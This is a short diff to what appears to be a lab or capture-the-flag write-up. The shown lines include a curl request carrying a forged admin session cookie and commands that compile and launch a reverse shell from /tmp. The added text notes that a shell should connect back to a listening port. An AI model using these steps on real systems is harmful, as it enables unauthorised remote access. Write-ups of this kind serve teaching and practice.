@@ -108,7 +108,12 @@ curl -b "session_token=eyd1c2VybmFtZSc6J2d1ZXN0JywgJ3JvbGUnOidhZG1pbid9./3b1GSdZ
 gcc -o /tmp/revshell /tmp/revshell.c
 chmod +x /tmp/revshell
 /tmp/revshell
-
-#then use curl as in the previous command to load it 
+#then a curl as in the previous command to load it, to grant it execution right and then lauchn it
 ````
+<p align="justify">If no error happended during compilation a revshell might have been received on the listening port opened </p>
+
+<p align="center">
+<img src="Screenshots/S11.png" style="width: 50%">
+</p>
+
 
